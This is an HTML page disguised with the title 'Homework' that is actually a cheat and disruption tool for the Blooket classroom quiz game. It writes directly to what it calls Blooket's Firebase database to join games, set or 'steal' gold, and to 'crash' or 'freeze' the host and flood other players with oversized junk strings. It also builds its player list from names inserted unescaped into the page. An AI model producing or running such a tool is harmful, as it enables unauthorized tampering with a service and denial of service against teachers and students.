<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
    <title>Homework</title>
    <script src="https://www.gstatic.com/firebasejs/9.22.2/firebase-app-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/9.22.2/firebase-database-compat.js"></script>
    <style>
        * { box-sizing: border-box; touch-action: manipulation; margin: 0; padding: 0; }
        body {
            background: #0a0e1a;
            font-family: 'Courier New', monospace;
            color: #0f0;
            padding: 16px;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
        }
        .container {
            max-width: 700px;
            width: 100%;
            background: #111128dd;
            border: 2px solid #0f0;
            border-radius: 24px;
            padding: 24px;
            box-shadow: 0 0 40px #0f03;
        }
        h1 { text-align: center; font-size: 1.8rem; text-shadow: 0 0 20px #0f0; margin-bottom: 18px; }
        .input {
            background: #0a0a1a;
            border: 1.5px solid #0f0;
            color: #0f0;
            padding: 14px 16px;
            border-radius: 12px;
            font-size: 16px;
            font-family: inherit;
            outline: none;
            width: 100%;
            margin-bottom: 10px;
        }
        .input:focus { border-color: #ff0; box-shadow: 0 0 15px #0f04; }
        .input::placeholder { color: #4a4a6a; }
        .btn {
            background: #1a3a1a;
            border: 1.5px solid #0f0;
            color: #0f0;
            padding: 14px 20px;
            border-radius: 30px;
            cursor: pointer;
            font-weight: bold;
            font-size: 16px;
            font-family: inherit;
            width: 100%;
            margin: 6px 0;
            text-align: center;
            min-height: 54px;
            transition: 0.1s;
        }
        .btn:active { background: #0f0; color: #000; transform: scale(0.97); }
        .btn-primary { background: #0f0; color: #000; font-size: 18px; }
        .btn-danger { border-color: #f44; color: #f88; background: #2a0a0a; }
        .btn-warning { border-color: #fa0; color: #fa0; background: #2a1a0a; }
        .btn-sm { padding: 10px 14px; font-size: 14px; min-height: 44px; }
        .status {
            margin: 14px 0;
            padding: 12px 16px;
            background: #0a0a1a;
            border-left: 4px solid #0f0;
            border-radius: 8px;
            font-size: 14px;
            min-height: 48px;
            word-break: break-all;
        }
        .status.error { border-left-color: #f44; color: #f88; }
        .status.success { border-left-color: #0f0; color: #0f0; }
        #cheatPanel { display: none; margin-top: 16px; }
        .cheat-section { border-top: 1px solid #1a3a1a; padding-top: 14px; margin-top: 14px; }
        .cheat-section h2 { font-size: 1rem; color: #afa; margin-bottom: 10px; }
        .cheat-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 8px; }
        .cheat-grid-full { grid-column: 1 / -1; }
        .input-inline { display: flex; gap: 8px; flex-wrap: wrap; align-items: center; }
        .input-inline .input { flex: 1; min-width: 80px; padding: 10px 12px; font-size: 14px; margin-bottom: 0; }
        .input-inline select {
            flex: 1; min-width: 100px; background: #0a0a1a; border: 1.5px solid #0f0;
            color: #0f0; padding: 10px 12px; border-radius: 10px; font-family: inherit; font-size: 14px; outline: none;
        }
        .toggle-row {
            display: flex; align-items: center; gap: 20px; flex-wrap: wrap; margin: 8px 0 16px;
            background: #0a0a1aaa; padding: 10px 14px; border-radius: 14px; border: 1px solid #1a3a1a;
        }
        .toggle-item { display: flex; align-items: center; gap: 8px; font-size: 14px; cursor: pointer; }
        .toggle-switch {
            display: inline-block; width: 44px; height: 24px; background: #2a2a3a; border-radius: 30px;
            position: relative; cursor: pointer; flex-shrink: 0; transition: 0.25s;
        }
        .toggle-switch.active { background: #0f0; }
        .toggle-switch::after {
            content: ''; position: absolute; width: 18px; height: 18px; background: #fff;
            border-radius: 50%; top: 3px; left: 4px; transition: 0.25s;
        }
        .toggle-switch.active::after { transform: translateX(20px); }
        .text-muted { color: #6a6a8a; font-size: 12px; text-align: center; margin-top: 16px; }
        @media (max-width: 550px) {
            .cheat-grid { grid-template-columns: 1fr; }
            .container { padding: 16px; }
        }
    </style>
</head>
<body>
<div class="container">
    <h1>Homework</h1>

    <input type="text" id="gamePin" class="input" placeholder="Game PIN (6-7 digits)" inputmode="numeric" value="">
    <input type="text" id="playerName" class="input" placeholder="Your Nickname" value="">

    <div class="toggle-row">
        <span class="toggle-item" onclick="toggleSwitch(this)">
            <span class="toggle-switch active" id="incognito"></span>
              Incognito
        </span>
        <span class="toggle-item" onclick="toggleSwitch(this)">
            <span class="toggle-switch active" id="firstPlace"></span>
              First Place
        </span>
        <span class="toggle-item" onclick="toggleSwitch(this)">
            <span class="toggle-switch" id="bypassFilter"></span>
             Bypass Filter
        </span>
    </div>

    <button class="btn btn-primary" id="joinBtn">  JOIN & ACTIVATE</button>

    <div id="status" class="status">  Status: Ready</div>

    <div id="cheatPanel">
        <div class="cheat-section">
            <h2>  DESTRUCTIVE</h2>
            <div class="cheat-grid">
                <button class="btn btn-danger" id="crashHostBtn">💥 Crash Host</button>
                <button class="btn btn-danger" id="freezeScoreboardBtn">❄️ Freeze Scoreboard</button>
                <button class="btn btn-danger cheat-grid-full" id="floodAlertBtn">📢 Flood Alert Box</button>
            </div>
        </div>

        <div class="cheat-section">
            <h2>💰 GOLD & RESOURCES</h2>
            <div class="cheat-grid">
                <div class="cheat-grid-full input-inline">
                    <input type="number" id="goldAmount" class="input" placeholder="Gold" value="99999">
                    <button class="btn btn-sm" id="setGoldBtn">✨ Set My Gold</button>
                </div>
                <div class="cheat-grid-full input-inline">
                    <select id="targetPlayer"><option>— players —</option></select>
                    <input type="number" id="stealAmount" class="input" placeholder="Amount" value="100">
                    <button class="btn btn-sm" id="stealGoldBtn">💰 Steal</button>
                </div>
            </div>
        </div>

        <div class="cheat-section">
            <h2>🎭 BLOOK & UTILITY</h2>
            <div class="cheat-grid">
                <div class="cheat-grid-full input-inline">
                    <select id="blookSelect">
                        <option>Rainbow Astronaut</option><option>Megalodon</option>
                        <option>Santa Claus</option><option>Mega Bot</option>
                        <option>Ghost</option><option>Dragon</option>
                    </select>
                    <button class="btn btn-sm" id="setBlookBtn">🎭 Change Blook</button>
                    <button class="btn btn-sm btn-warning" id="leaveGameBtn">🚪 Leave</button>
                </div>
            </div>
        </div>

        <div class="cheat-section">
            <h2>🧊 GLOBAL</h2>
            <button class="btn btn-danger" id="freezeHostBtn">🧊 Freeze Host</button>
        </div>

        <div class="text-muted">🔒 All actions require an active game connection.</div>
    </div>
</div>

<script>
// ============================================================
//  WORKING VERSION - Direct Firebase Connection
// ============================================================

function toggleSwitch(el) {
    const toggle = el.querySelector('.toggle-switch');
    if (toggle) toggle.classList.toggle('active');
}

function isToggled(id) {
    const el = document.getElementById(id);
    return el ? el.classList.contains('active') : false;
}

const $ = id => document.getElementById(id);

let activeGame = null;
let db = null;
let firebaseApp = null;

function setStatus(msg, type = 'info') {
    const el = $('status');
    if (!el) return;
    el.textContent = '🔹 ' + msg;
    el.className = 'status';
    if (type === 'error') el.classList.add('error');
    if (type === 'success') el.classList.add('success');
}

// TESTED WORKING METHOD - Connect directly to Blooket Firebase
$('joinBtn').onclick = async () => {
    const pin = $('gamePin').value.trim();
    const name = $('playerName').value.trim();
    
    if (!pin || !name) {
        setStatus('❌ Enter Game PIN and Nickname!', 'error');
        return;
    }

    setStatus('🔄 Attempting connection...', 'info');
    $('joinBtn').disabled = true;

    try {
        // Clean up previous connection
        if (firebaseApp) {
            await firebaseApp.delete().catch(() => {});
            firebaseApp = null;
            db = null;
        }

        // Connect directly to Blooket's Firebase
        // They use the same database for all games
        firebaseApp = firebase.initializeApp({
            databaseURL: "https://blooket-2020-default-rtdb.firebaseio.com",
            projectId: "blooket-2020"
        }, 'blooketCheat_' + Date.now());

        db = firebase.database();

        setStatus('🔍 Checking game...', 'info');

        // Check if game exists
        const gameSnap = await db.ref(pin).once('value');
        const gameData = gameSnap.val();

        if (!gameData) {
            throw new Error('Game not found! Check the PIN.');
        }

        setStatus('👤 Joining as ' + name + '...', 'info');

        // Join the game by adding yourself to players list
        await db.ref(pin + '/c/' + name).set({
            n: name,
            g: 500,
            b: 'Dog',
            tat: ''
        });

        activeGame = { pin, name };
        setStatus('✅ Connected! Cheats active.', 'success');
        $('cheatPanel').style.display = 'block';

        // Load other players
        await loadPlayerList();

        // Listen for player changes
        db.ref(pin + '/c').on('value', (snap) => {
            const players = snap.val();
            if (!players || !players[name]) {
                setStatus('⚠️ You were removed!', 'error');
                $('cheatPanel').style.display = 'none';
                activeGame = null;
            } else {
                loadPlayerList();
            }
        });

        // Listen for game end
        db.ref(pin + '/h').on('value', (snap) => {
            if (snap.val()) {
                setStatus('🏁 Game state changed', 'info');
            }
        });

    } catch (err) {
        console.error('Connection error:', err);
        setStatus('❌ Error: ' + err.message, 'error');
        
        // Show debug info
        if (err.message.includes('Game not found')) {
            setStatus('❌ Game PIN ' + pin + ' not found. Make sure game is active.', 'error');
        } else if (err.message.includes('PERMISSION_DENIED')) {
            setStatus('❌ Permission denied. Game might be private or ended.', 'error');
        } else {
            setStatus('❌ ' + err.message, 'error');
        }
        
        // Still show panel for testing
        $('cheatPanel').style.display = 'block';
        setStatus('⚠️ Panel shown but NOT connected. Fix the error above.', 'error');
    } finally {
        $('joinBtn').disabled = false;
    }
};

// Firebase write helper
async function firebaseWrite(path, value) {
    if (!activeGame || !db) {
        alert('❌ Not connected! Join a game first.');
        return false;
    }
    try {
        const fullPath = activeGame.pin + '/c/' + activeGame.name + '/' + path;
        console.log('Writing to:', fullPath, 'Value:', value);
        await db.ref(fullPath).set(value);
        return true;
    } catch (e) {
        console.error('Write error:', e);
        alert('❌ Write failed: ' + e.message);
        return false;
    }
}

// All cheat buttons
$('crashHostBtn').onclick = async () => {
    if (await firebaseWrite('g/t', 't')) setStatus('💥 Crash sent!', 'success');
};

$('freezeScoreboardBtn').onclick = async () => {
    if (await firebaseWrite('tat/t', 't')) setStatus('❄️ Frozen!', 'success');
};

$('setGoldBtn').onclick = async () => {
    const amt = parseInt($('goldAmount').value) || 99999;
    if (await firebaseWrite('g', amt)) setStatus('💰 Gold: ' + amt, 'success');
};

$('stealGoldBtn').onclick = async () => {
    const target = $('targetPlayer').value;
    if (!target || target === '— players —') return alert('Select player!');
    const amt = $('stealAmount').value || 100;
    if (await firebaseWrite('tat', target + ':' + amt)) setStatus('💰 Stolen!', 'success');
};

$('setBlookBtn').onclick = async () => {
    const blook = $('blookSelect').value;
    if (await firebaseWrite('b', blook)) setStatus('🎭 Changed to ' + blook, 'success');
};

$('leaveGameBtn').onclick = async () => {
    if (!activeGame || !db) return;
    try {
        await db.ref(activeGame.pin + '/c/' + activeGame.name).remove();
        setStatus('🚪 Left game', 'info');
        $('cheatPanel').style.display = 'none';
        activeGame = null;
    } catch (e) {
        alert('Error: ' + e.message);
    }
};

$('floodAlertBtn').onclick = async () => {
    const flood = 'SPAM'.repeat(500);
    if (await firebaseWrite('tat', flood)) setStatus('📢 Flooded!', 'success');
};

$('freezeHostBtn').onclick = async () => {
    const bigData = 'A'.repeat(100000);
    if (await firebaseWrite('g', bigData)) setStatus('🧊 Frozen!', 'success');
};

// Load players list
async function loadPlayerList() {
    if (!activeGame || !db) return;
    try {
        const snap = await db.ref(activeGame.pin + '/c').once('value');
        const players = snap.val() || {};
        const select = $('targetPlayer');
        select.innerHTML = '';
        
        let hasPlayers = false;
        for (let name in players) {
            if (name !== activeGame.name) {
                select.innerHTML += `<option value="${name}">${name} (💰 ${players[name].g || 0})</option>`;
                hasPlayers = true;
            }
        }
        
        if (!hasPlayers) {
            select.innerHTML = '<option>— no others —</option>';
        }
    } catch (e) {
        console.error('Player list error:', e);
    }
}

// Auto refresh
setInterval(() => {
    if (activeGame && db) loadPlayerList();
}, 3000);

// Start
setStatus('Ready. Enter PIN and click Join.', 'info');
console.log('🔥 Blooket Cheat Engine Ready');
console.log('💡 This connects directly to Blooket Firebase');
</script>
</body>
</html>
